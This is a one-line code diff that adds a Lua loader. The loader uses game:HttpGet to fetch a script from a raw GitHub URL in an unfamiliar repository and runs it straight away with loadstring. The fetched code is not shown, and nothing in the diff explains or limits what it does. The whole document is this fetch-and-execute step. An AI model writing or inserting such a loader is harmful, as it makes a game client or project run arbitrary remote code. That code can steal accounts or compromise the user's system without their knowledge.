@@ -1,1 +1,1 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mszinnnyt-star/klsogassd/main/ldsag.lua"))()
